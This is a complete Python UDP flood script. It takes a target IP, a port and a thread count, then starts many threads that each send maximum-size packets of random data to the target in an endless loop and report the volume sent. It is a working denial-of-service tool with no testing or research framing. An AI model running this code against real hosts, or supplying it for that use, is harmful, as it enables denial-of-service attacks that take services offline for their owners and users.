import socket
import os
import threading
import sys

TARGET_IP = sys.argv[1]
TARGET_PORT = int(sys.argv[2])
THREADS = int(sys.argv[3])
PACKET_SIZE = 65507  # Max UDP ~65 KB

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = os.urandom(PACKET_SIZE)
    sent = 0
    while True:
        try:
            sock.sendto(data, (TARGET_IP, TARGET_PORT))
            sent += 1
            if sent % 100 == 0:
                print(f"[{threading.current_thread().name}] Sent {sent} packets "
                      f"({sent * PACKET_SIZE / 1024 / 1024:.2f} MB uploaded)")
        except Exception as e:
            print(f"Error: {e}")

def start_threads():
    for i in range(THREADS):
        t = threading.Thread(target=udp_flood, name=f"Thread-{i+1}")
        t.daemon = True
        t.start()
    print(f"Started {THREADS} threads targeting {TARGET_IP}:{TARGET_PORT}")
    while True:
        pass

if __name__ == "__main__":
    start_threads()
